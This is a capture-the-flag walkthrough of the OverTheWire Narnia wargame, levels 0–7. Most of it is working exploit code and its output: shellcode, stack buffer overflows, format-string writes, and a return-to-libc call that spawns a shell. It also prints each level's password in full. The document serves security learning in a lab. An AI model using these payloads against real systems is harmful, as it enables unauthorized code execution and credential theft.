# [The Narnia wargame](https://overthewire.org/wargames/narnia/)
host: [narnia.labs.overthewire.org](narnia.labs.overthewire.org)  
port: 2226  
username: narnia<level>  
start password: narnia0  
### login via ssh
```
ssh narnia<level>@narnia.labs.overthewire.org -p 2226
```

### level 0 -> 1
Simple buffer overflow
```shell
narnia0@narnia:/narnia$ (printf 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde';cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
**password:**  
efeidiedae

### level 1 -> 2
We need to set environment variable named "EGG" to shellcode the program will run  
I use [this](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode to open shell as narnaia1
```shell
narnia1@narnia:/narnia$ export EGG=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
```
**password:**  
nairiepecu
  
### level 2 -> 3
There is unsafe copy to buffer, we can use this to set return address to run our shellcode.
First of all we need to find what offset the return address, we will use gdb with breakpoint before the ret command.
```shell
narnia2@narnia:/narnia$ gdb -q ./narnia2
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804844b <+0>:     push   %ebp
   0x0804844c <+1>:     mov    %esp,%ebp
      ...
   0x08048497 <+76>:    mov    $0x0,%eax
   0x0804849c <+81>:    leave                 <- we will put breakpoint her
   0x0804849d <+82>:    ret
End of assembler dump.
(gdb) b *0x0804849c
Breakpoint 1 at 0x804849c
(gdb) r $(python -c "print('A'*132+'B'*4)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c "print('A'*132+'B'*4)")

Breakpoint 1, 0x0804849c in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()                         <- the four 'B' override the return address
```
Now lets create the payload, it will be in this format:  
`(A series of NOP instructions(0x90)) (Shellcode) (Overridden return address)`  
the return address will jump to address just before the shellcode.  
I use the [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode(25 bytes) as in the previous level.  
We just need to know the address before the shellcode:  
```shell
(gdb) r $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")

Breakpoint 1, 0x0804849c in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/150wx $esp
0xffffd640:     0x00000000      0xffffd6d4      0xffffd6e0      0x00000000
0xffffd650:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
...
0xffffd7f0:     0x9e797a0d      0x9908446a      0x695d19dc      0x00363836
0xffffd800:     0x6e2f0000      0x696e7261      0x616e2f61      0x61696e72
0xffffd810:     0x41410032      0x41414141      0x41414141      0x41414141          <- the 'A's start somewhere here
0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd870:     0x41414141      0x41414141      0x41414141      0x50c03141          <- here the shellcode start
0xffffd880:     0x732f2f68      0x622f6868      0xe3896e69      0xe1895350
0xffffd890:     0x0bb0c289      0x424280cd
```
So, let choose 0xffffd870, now use the payload!
```shell
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print('\x90'*107 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x70\xd8\xff\xff')")
$ cat /etc/narnia_pass/narnia3
vaequeezee
```
  
**password:**  
vaequeezee
                                                                                       
### level 3 -> 4
Their is unsafe copy from argv[1] to ifile, so we can overflow and get into ofile  
We need to give the program path that serve as somthing we want to read and also serve as payload that pushed to 'ofile' and serve as output file we can read. The path will be in this format:  
`/tmp/(some padding)/tmp/result`  
`/tmp/result` will serve as output file and `/tmp/(padding)/tmp/result` as link to password (`/etc/narnia_pass/narnia4`)  
Therefore the program will read all data from `/tmp/<padding>/tmp/result` and insead of write it to /dev/null he will write it to `/tmp/result and we can read it.  
I create [this](https://gist.github.com/bom2013/919a78a2dcb44689d37587bedb43be49) script in some folder inside /tmp/ and run it
```shell
narnia3@narnia:/tmp/qwert$ ./solve.sh
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/result to a safer place... (/tmp/result)
thaenohtai
(.PT narnia3@narnia:/tmp/qwert$
```
**password:**  
thaenohtai
  
### level 4 -> 5
This is actually same as level 2, all the things in the middle of the program isn't importent, what important is the unsafe copy from argv[1] to the buffer.  
We will create same payload(NOPs + shellcode + return address that jump to the middle of the NOPs)  
The steps of preparing the payload using gdb:   
1. Find offset to override the return address: 264 bytes  
2. Find some address in the middle of the NOPs: 0xffffd880
3. Get shellcode: [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode
4. Create the full payload: ```'\x90'*239 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x80\xd8\xff\xff'```
```shell
narnia4@narnia:/narnia$ ./narnia4 $(python -c "print('\x90'*239 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x80\xd8\xff\xff')")
$ cat /etc/narnia_pass/narnia5
faimahchiy
```
**password:**  
faimahchiy

### level 5 -> 6
There is unsafe use of snprintf(use without string format):
```c
snprintf(buffer, sizeof buffer, argv[1]);
```
this makes the program vulnerable to a [string format attack](https://owasp.org/www-community/attacks/Format_string_attack).  
Let's try to use string format to make sure the code is vulnerable to this attack:  
```shell
narnia5@narnia:/narnia$ ./narnia5 %x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000] (8)
i = 1 (0xffffd6e0)
```
Ok, it's vulnerable, now lets create the exploit.  
(I use [this](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf) wonderful paper to learn about this type of attack and to create the exploit)  
We want to use some string format that will allow us to change the value of 'i', the string will be in this format:  
`(address of i)(some padding to extend the string size to 500)('%n' to write 500 to the address)`  
the actual implementation is:  
1. Address of 'i': `\xe0\xd6\xff\xff`
2. Padding: `%496x`
3. Write character: `%1$n`  (I use the [parameter field](https://en.wikipedia.org/wiki/Printf_format_string#Format_placeholder_specification) (`1$`) to specifie the parameter to write to (the address of i), without this the `%x` will use the address and the %n will not have it)  
  
Lets use this:  
```shell
narnia5@narnia:/narnia$ ./narnia5 $(python -c "print('\xe0\xd6\xff\xff')")%496x%1\$n
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
```
**password:**
neezocaeng

### level 6 -> 7
When we inspect the program source code we find some anomalies and interesting things:  
1. We import `stdio.h`, `stdlib.h` and `string.h`  
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  ```
2. Use of unsafe `strcpy` function to copy `arg[1]` and `arg[2]` to `b1` and `b2`  
  ```c
  strcpy(b1,argv[1]);
  strcpy(b2,argv[2]);
  ```
3. We call `puts` function using function pointer `fb` with `b1` as argument  
  ```c
  int  (*fp)(char *)=(int(*)(char *))&puts, i;
  ...
  fp(b1);
  ```
So we can buffer overflow `b1` and `b2` to change fb to jump to our shell code, the problem is `b1` and `b2` are very small for shell code(only 8 bytes).  
This is where the fact that we found that the program include `stdlib.h` turns out to be useful, we can than use Return-to-libc attack to jump to `system()` (that include in this lib) and start `/bin/sh` shell.  
For this we need to set `b1` to overflow `fb` to `system()`.  
The problem is we also need `b1` for argument for `system()`, and if we try to overflow `fb` to something like `('/bin/sh'<system() address>)` the `strcpy` function will copy only the `/bin/sh` to b1 (because it stop when he get to NULL terminator) (Later I realized that there is actually another problem and that is that `/bin/sh` will actually take 9 bytes and will "push" into the fb address first byte we are trying to override as well).  
So what we will do is overflow `b1` to change `fb` to `system()` address, and then overflow `b2` to change `b1` to `/bin/sh`.  
The steps for solve:  
1. Find offset to `fb`
2. Find `system()` address
3. Create the argument exploit string
4. Run it :)
#### Find offset to `fb`:  
```shell
narnia6@narnia:/narnia$ gdb -q narnia6
Reading symbols from narnia6...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080485a8 <+0>:     push   %ebp
   0x080485a9 <+1>:     mov    %esp,%ebp
   0x080485ab <+3>:     push   %ebx
   ...
   0x080486d8 <+304>:   call   0x8048450 <setreuid@plt>
   0x080486dd <+309>:   add    $0x8,%esp
   0x080486e0 <+312>:   lea    -0x14(%ebp),%eax
   0x080486e3 <+315>:   push   %eax
   0x080486e4 <+316>:   mov    -0xc(%ebp),%eax
   0x080486e7 <+319>:   call   *%eax                      <- this is fb(b1), so lets break here
   0x080486e9 <+321>:   add    $0x4,%esp
   0x080486ec <+324>:   push   $0x1
   0x080486ee <+326>:   call   0x8048440 <exit@plt>
   End of assembler dump.
(gdb) break *main+319
Breakpoint 1 at 0x80486e7
(gdb) run AAAA BBBB
Starting program: /narnia/narnia6 AAAA BBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/x $eax
0x8048430 <puts@plt>:   0x99c825ff                        <- We see that fb now point to puts()
(gdb) x/40 $ebp-40
0xffffd690:     0x080486dd      0x000036b6       0xffffd6a4      *0x42424242*      <- this is the BBBB in b2
0xffffd6a0:     0xf7fc5300      *0x41414141*     0x08048700      *0x08048430*      <- this is AAAA in b1 and the 0x8048430 in fb()
0xffffd6b0:     0x00000003      0x00000000       0x00000000      0xf7e2a286
0xffffd6c0:     0x00000003      0xffffd754       0xffffd764      0x00000000
0xffffd6d0:     0x00000000      0x00000000       0xf7fc5000      0xf7ffdc0c
0xffffd6e0:     0xf7ffd000      0x00000000       0x00000003      0xf7fc5000
0xffffd6f0:     0x00000000      0x59f3f73f       0x631afb2f      0x00000000
0xffffd700:     0x00000000      0x00000000       0x00000003      0x080484a0
0xffffd710:     0x00000000      0xf7fee710       0xf7e2a199      0xf7ffd000
0xffffd720:     0x00000003      0x080484a0       0x00000000      0x080484c1
```
Lets try overflow `fb` address using `b1` and overflow start of `b1` using `b2`
```shell
(gdb) run $(python -c "print('A'*8 + 'XXXX' + ' ' + 'B'*8 + 'YYYY')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c "print('A'*8 + 'XXXX' + ' ' + 'B'*8 + 'YYYY')")

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/40 $ebp-40
0xffffd680:     0x080486dd      0x000036b6       0xffffd694       *0x42424242          <- start of b1
0xffffd690:     0x42424242      0x59595959*      *0x41414100      0x58585858*          <- b1 overflow b2 and b1 overflow fb
0xffffd6a0:     0x00000000      0x00000000       0x00000000       0xf7e2a286
0xffffd6b0:     0x00000003      0xffffd744       0xffffd754       0x00000000
0xffffd6c0:     0x00000000      0x00000000       0xf7fc5000       0xf7ffdc0c
0xffffd6d0:     0xf7ffd000      0x00000000       0x00000003       0xf7fc5000
0xffffd6e0:     0x00000000      0x5956a581       0x63bf4991       0x00000000
0xffffd6f0:     0x00000000      0x00000000       0x00000003       0x080484a0
0xffffd700:     0x00000000      0xf7fee710       0xf7e2a199       0xf7ffd000
0xffffd710:     0x00000003      0x080484a0       0x00000000       0x080484c1
(gdb) x/x $eax
0x58585858:     Cannot access memory at address 0x58585858
(gdb)
```
#### Find address of `system()`
```c
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
```
#### Create the argument exploit string
The exploit will be:   
* arg[1] = `<8 byte padding><system() address>`
* arg[1] = `<8 byte padding><'/bin/sh'>`
#### Run
```shell
narnia6@narnia:/narnia$ ./narnia6 $(python -c "print('A'*8 + '\x50\xc8\xe4\xf7' + ' ' + 'B'*8 + '/bin/sh')")
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
```
**password:**
ahkiaziphu

### level 7 -> 8
Like level 5, there is unsafe use of `snprintf` function that make the program vulnerable to string format attack.  
We need to change the ptrf to the address of `hackedfunction()`, luckily the program print anything:
```shell
narnia7@narnia:/narnia$ ./narnia7 A
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```
So we need to change the content of `ptrf` whose addres is `0xffffd658` to the address of `hackedfunction()` whose addres is `0x8048724`.  
We will do it in the way we do it in level 5: `<address to change>%<number we want to insert in decimal format>x%n`.
```shell
narnia7@narnia:/narnia$ python -c "print(int('0x8048724', 16))"
134514468
narnia7@narnia:/narnia$ ./narnia7 $(python -c "print('\x58\xd6\xff\xff%134514468x%n')")
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Way to go!!!!$ cat /etc/narnia_pass/narnia8
mohthuphog
```
**password:**
mohthuphog

### level 8 -> 9

**password:**

